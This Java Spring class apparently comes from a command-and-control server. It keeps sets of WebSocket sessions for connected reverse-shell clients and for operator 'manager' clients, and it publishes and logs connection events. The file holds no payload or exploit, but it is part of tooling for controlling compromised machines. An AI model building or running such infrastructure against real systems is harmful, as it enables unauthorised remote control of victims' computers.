package com.mtattab.c2cServer.service.observable;

import com.mtattab.c2cServer.model.MessageEventModel;
import com.mtattab.c2cServer.model.enums.events.ActiveSessionsEvents;
import com.mtattab.c2cServer.util.ConnectionManager;
import lombok.Data;
import lombok.extern.slf4j.Slf4j;

import org.springframework.context.ApplicationEventPublisher;
import org.springframework.context.ApplicationEventPublisherAware;
import org.springframework.stereotype.Component;
import org.springframework.web.socket.WebSocketSession;

import java.util.HashSet;
import java.util.Set;



@Component
@Data
@Slf4j
public class ActiveSessionsObservable  implements ApplicationEventPublisherAware {

    private ApplicationEventPublisher applicationEventPublisher;


    Set<WebSocketSession> activeReverseShellSessions = new HashSet<>();


    Set<WebSocketSession> activeMangerSessions = new HashSet<>();

    @Override
    public void setApplicationEventPublisher(ApplicationEventPublisher applicationEventPublisher) {
        this.applicationEventPublisher = applicationEventPublisher;
    }


    public void addReverseShellSession(WebSocketSession session){
        activeReverseShellSessions.add(session);

        this.applicationEventPublisher.publishEvent(new MessageEventModel(this, ActiveSessionsEvents.RECEIVED_NEW_CONNECTION, session));

        log.info("[+] New Session established {}",session);

    }

    public void removeReverseShellSession(WebSocketSession session){
        activeReverseShellSessions.remove(session);
        this.applicationEventPublisher.publishEvent(new MessageEventModel(this, ActiveSessionsEvents.LOST_CONNECTION, session));
        ConnectionManager.disconnectConnection(session);

        log.info("[+] Session Closed {}",session);


    }

    public void addManagerSession(WebSocketSession session){
        activeMangerSessions.add(session);
    }
    public void removeManagerSession(WebSocketSession session){
        activeMangerSessions.remove(session);
        ConnectionManager.disconnectConnection(session);


    }





}
